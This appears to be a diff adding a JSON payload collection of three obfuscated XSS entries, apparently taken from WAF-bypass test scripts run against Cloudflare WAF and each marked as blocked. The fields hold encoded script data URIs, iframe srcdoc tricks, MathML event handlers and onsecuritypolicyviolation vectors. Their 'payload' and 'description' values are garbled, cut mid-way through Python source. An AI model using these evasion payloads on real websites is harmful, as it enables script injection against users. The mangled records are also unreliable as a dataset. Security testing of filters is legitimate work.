@@ -1,0 +1,49 @@
+{
+  "category": "xss",
+  "subcategory": "obfuscated",
+  "count": 3,
+  "payloads": [
+    {
+      "id": "xss-0024",
+      "category": "xss",
+      "subcategory": "obfuscated",
+      "payload": "\n--- E: PortSwigger Obfuscation ---\")\n\nPS_OBFUSC = [\n    '<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>",
+      "description": "<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>',\n    '<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>',\n    '<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',\n    \"\"\"<iframe src=\"javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'\"></iframe>\"\"\",\n    '<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>',\n]\n\nfor p in PS_OBFUSC:\n    test(p)\nprint(f\"  PS obfuscation done: {total} total",
+      "technique": "obfuscation",
+      "source_file": "waf_round72_oss2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0042",
+      "category": "xss",
+      "subcategory": "obfuscated",
+      "payload": "=\" * 70 + \"\n\")\n\n# Try event handlers on math elements\nmath_events = {\n    # Direct events on <math>\n    \"math-onclick\": '<math onclick=alert(1)>x</math>",
+      "description": "math-onfocus\": '<math onfocus=alert(1) tabindex=1>x</math>',\n    \"math-onmouseover\": '<math onmouseover=alert(1)>x</math>',\n    \"math-onload\": '<math onload=alert(1)>x</math>',\n\n    # Events on child elements\n    \"mtext-onclick\": '<math><mtext onclick=alert(1)>x</mtext></math>',\n    \"mi-onclick\": '<math><mi onclick=alert(1)>x</mi></math>',\n    \"mo-onclick\": '<math><mo onclick=alert(1)>+</mo></math>',\n    \"mn-onclick\": '<math><mn onclick=alert(1)>1</mn></math>',\n    \"mrow-onclick\": '<math><mrow onclick=alert(1)>x</mrow></math>',\n    \"merror-onclick\": '<math><merror onclick=alert(1)>x</merror></math>',\n\n    # Using confirm/prompt instead of alert\n    \"math-onclick-confirm\": '<math onclick=confirm(1)>x</math>',\n    \"math-onclick-prompt\": '<math onclick=prompt(1)>x</math>',\n    \"math-onclick-print\": '<math onclick=print()>x</math>',\n\n    # Obfuscated function calls\n    \"math-onclick-top\": '<math onclick=top[\"alert",
+      "technique": "obfuscation",
+      "source_file": "waf_round7_math.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0474",
+      "category": "xss",
+      "subcategory": "obfuscated",
+      "payload": "\n\" + \"=\" * 75)\nprint(\"16D: securitypolicyviolation Event (CSP error handler)\")\nprint(\"=\" * 75 + \"\n\")\n\n# onsecuritypolicyviolation fires when CSP is violated.\n# If the page has a CSP, injecting content that violates it triggers this.\nspv = {\n    \"html-body-spv\": '<body onsecuritypolicyviolation=alert(1)>",
+      "description": "html-div-spv\": '<div onsecuritypolicyviolation=alert(1)>x</div>',\n    \"attr-spv\": {\"attributeHtml\": '\" onsecuritypolicyviolation=alert(1) x=\"'},\n    \"sc-div-spv\": {\"attributeHtml\": '\"/><div onsecuritypolicyviolation=alert(1)>'},\n    \n    # Mixed case\n    \"html-OnSecurityPolicyViolation\": '<div OnSecurityPolicyViolation=alert(1)>x</div>',\n    \n    # With Only= trick\n    \"html-div-Only-spv\": '<div Only=1 onsecuritypolicyviolation=alert(1)>x</div>',\n}\n\nfor name, payload in spv.items():\n    if isinstance(payload, dict):\n        test(name, payload)\n    else:\n        test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"16E: Attribute Stuffing + Multiple Tag Names",
+      "technique": "obfuscation",
+      "source_file": "waf_round16.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
